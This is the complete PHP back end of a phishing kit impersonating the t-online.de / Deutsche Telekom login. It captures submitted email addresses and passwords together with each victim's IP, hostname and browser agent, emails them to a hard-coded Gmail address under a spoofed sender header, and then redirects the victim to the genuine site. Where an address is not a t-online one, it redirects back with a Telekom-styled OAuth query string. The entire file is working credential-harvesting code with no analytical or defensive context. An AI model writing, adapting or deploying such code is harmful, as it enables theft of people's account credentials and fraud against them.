<?php
session_start();
ob_start();

//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];

//Filling Email to send
$SEND = 'saintsaint260@gmail.com';


//Getting UserID info from Session
$_SESSION['username'] = $username = $_POST['pw_usr'];
$_SESSION['password'] = $password = $_POST['pw_pwd'];

$domain = @substr(strrchr($username, "@"), 1);
$downletter = strtolower("$domain");

// pass valid/invalid emails
if (filter_var($username, FILTER_VALIDATE_EMAIL)&& stripos($downletter, "t-online.de") !== false) 
{
  
  
$brigs="==================P05tM@5T3r==================
Email: $username
Password   : $password
-------------------+P05tM@5T3r+---------------------
Client IP: $ip
Check IP: https://geoiptool.com/en/?ip=$ip
Hostname: $hostname
Agent: $agent
-----------------+P05tM@5T3r+-----------------";


$subject = "$username | Secure~Server";
$headers = "From: PosTMasteR<kelvin@tf-info.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($SEND,$subject,$brigs,$headers);

$Redirect="https://www.t-online.de";
session_destroy();
header("Location: $Redirect");

  
  
}
else 
{
 //Exiting to next page
$asp = "error=invalidemail&echo=$username&uri=https://accounts.login.idm.telekom.com/oauth2/auth?scope=openid&claims=%7B%22id_token%22%3A%7B%22urn%3Atelekom.com%3Aall%22%3A%7B%22essential%22%3Atrue%7D%7D%7D&response_type=code&redirect_uri=https%3A%2F%2Faccount.idm.telekom.com%2Faccount-manager%2Fopenid_connect_login&state=36184e7e08e66&logout_uri=https%3A%2F%2Faccount.idm.telekom.com%2Faccount-manager%2Flogout&nonce=563d9372867c&client_id=10LIVESAM30000004901AM200000000000000000";
$mover = "./?$asp";
header ("Location: $mover");  
}




?>
